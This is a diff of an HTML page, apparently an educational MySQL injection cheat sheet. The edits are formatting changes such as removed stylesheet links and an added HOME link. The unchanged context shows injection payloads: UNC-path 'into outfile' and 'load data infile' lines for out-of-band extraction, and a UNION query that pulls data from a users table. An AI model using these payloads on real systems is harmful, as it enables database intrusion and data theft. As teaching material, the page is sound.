@@ -2,14 +2,14 @@
 <html lang="en">
   <head>
     <meta charset="utf-8">
-    <link crossorigin="anonymous" media="all" integrity="sha512-dsqgdBtnWun6oxDg9q1xezEyITXQ8QsMdFm+JDoDk6Tzx9AEE1XcUEhWff/M2Jv85ucTVJCjp/2fGbh6Omtrgg==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-41c2037bf12f1e46d8f08b88a04a8d8f.css" />
-    <link crossorigin="anonymous" media="all" integrity="sha512-7r2i4qESTZjrZJtYNUaBF6Dcj76UPG7nE0UAqVClrGUd7dehuwkBTiAMnQqZ0EFWoYYbSAMs5tLwNue5S1VhaA==" rel="stylesheet" href="https://github.githubassets.com/assets/github-743d1ecdae952365d80e5c6ac503d0af.css" />
     <meta name="viewport" content="width=device-width">
     <link href="sql.css" rel="stylesheet">
+
     <link href="https://fonts.googleapis.com/css?family=Playfair+Display&display=swap" rel="stylesheet">
     <title>MYSQL Cheat sheet</title>
 
-
+</head>
+<body>
 
 
 
@@ -17,6 +17,7 @@
 
 <div class="mysql">
 <h1>MYSQL Injection</h1>
+<em><a style="color:green" href="https://anir0y.github.io/class/">HOME</em>
 <br><br><br>
 
 <h2>MYSQL comment</h2>
@@ -187,7 +188,7 @@ select @<span class="pl-smi">@version</span> into dumpfile <span class="pl-s"><s
 <span class="pl-k">select</span> <span class="pl-s"><span class="pl-pds">'</span>osanda<span class="pl-pds">'</span></span> into outfile <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\\\</span>error<span class="pl-cce">\\</span>abc<span class="pl-pds">'</span></span>;
 load data infile <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\\\</span>error<span class="pl-cce">\\</span>abc<span class="pl-pds">'</span></span> into table <span class="pl-c1">database</span>.<span class="pl-c1">table_name</span>;</pre></div>
 <br><hr><br>
-<h2>MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from <p>(select 1,2,3,4,5,6 union select * from users)a limit 1,1);References</h2>
+<h2>MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);References</h2>
 <ul>
 <li><a href="https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf" rel="nofollow">MySQL Out of Band Hacking - @OsandaMalith</a></li>
 <li><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" rel="nofollow">[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148</a></li>
@@ -197,3 +198,5 @@ load data infile <span class="pl-s"><span class="pl-pds">'</span><span class="pl
 <li><a href="https://sqlwiki.netspi.com/injectionTypes/errorBased" rel="nofollow">SQL Wiki - netspi</a></li>
 <li><a href="https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100">ekoparty web_100 - 2016/10/26 - p4-team</a></li>
 </ul>
+</body>
+</html>
